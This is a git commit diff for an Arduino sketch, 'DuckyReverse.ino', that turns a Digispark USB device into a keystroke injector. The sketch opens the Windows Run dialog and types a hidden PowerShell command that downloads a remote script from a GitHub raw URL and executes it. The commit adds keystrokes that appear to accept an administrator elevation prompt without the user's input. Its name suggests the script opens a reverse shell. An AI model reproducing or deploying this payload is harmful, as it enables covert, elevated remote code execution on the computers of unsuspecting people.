6838934e08effa971630ed5f2441a2c2f21ebbc7
Nooble <kieranaslett@gmail.com>
2019-02-04 19:45:36 +0000

    Update DuckyReverse.ino

--- DuckyReverse/DuckyReverse.ino
+++ DuckyReverse/DuckyReverse.ino
@@ -8,7 +8,9 @@ void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell.exe -WindowStyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/run.ps1');");
- DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT)
+ DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
+ DigiKeyboard.delay(5000);
+ DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
  for (;;) {
 }
 }
